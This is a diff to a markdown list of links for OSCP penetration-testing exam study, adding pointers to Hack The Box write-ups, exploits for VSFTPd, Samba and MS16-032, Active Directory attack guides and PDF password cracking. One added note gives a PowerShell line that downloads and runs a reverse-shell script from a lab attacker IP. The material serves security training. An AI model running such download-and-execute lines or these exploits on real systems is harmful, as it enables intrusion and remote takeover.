@@ -2,6 +2,16 @@ TJNull's OSCP Notes - https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to
 
 [Hashcat Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
+[Log in to w/ SMTP creds via Evolution](https://0xdf.gitlab.io/2022/05/16/htb-brainfuck.html)
+
+[Escape restricted shell rshell](https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/)
+
+[VSFTd 2.3.4 exploit](https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html)
+
+[Samba username map script exploit](https://0xdf.gitlab.io/2020/04/07/htb-lame.html#samba-exploit)
+
+[Pre-Compiled Windows Exploits for common vulns](https://github.com/abatchy17/WindowsExploits)
+
 [Abusing Active Directory ACLs and ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 
 [PowerView Cheatsheet](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/)
@@ -9,6 +19,8 @@ TJNull's OSCP Notes - https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to
 [Silver Ticket AD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services)
 
 [Domain Escalation Resource Based Constrained Delegation](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)
+
+[Active Directory Post Exploitation Methodology](https://cr0mll.github.io/cyberclopaedia/Post%20Exploitation/Active%20Directory%20(AD)/index.html)
 
 [Active Directory Kerberos Delegation Walkthroughs](https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/)
 
@@ -25,6 +37,11 @@ TJNull's OSCP Notes - https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to
 [Detailed guide for Rubeus](https://www.hackingarticles.in/a-detailed-guide-on-rubeus/)
 
 [PowerView cheatsheet](https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet)
+
+[How to exploit MS16-032](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)
+
+[MS16-032 Exploit Script](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) 
+**note** add a line at the end `Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1')"` 
 
 [/etc/shadow and passwd file formats](https://www.cyberciti.biz/faq/understanding-etcshadow-file/#:~:text=The%20%2Fetc%2Fshadow%20is%20a,only%20to%20the%20root%20user.)
 
@@ -142,7 +159,9 @@ TJNull's OSCP Notes - https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to
 
 [Kerberoast GitHub (steps to get SPN's and tickets)](https://github.com/nidem/kerberoast)
 
-[Cyber Chef - Decoder/encoder]
+[Cyber Chef - Decoder/encoder](https://gchq.github.io/CyberChef/)
+
+[Brute Force password protected PDF](https://ourcodeworld.com/articles/read/939/how-to-crack-a-pdf-password-with-brute-force-using-john-the-ripper-in-kali-linux)
 
 [Buffer Overflow Cheatsheet](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
 
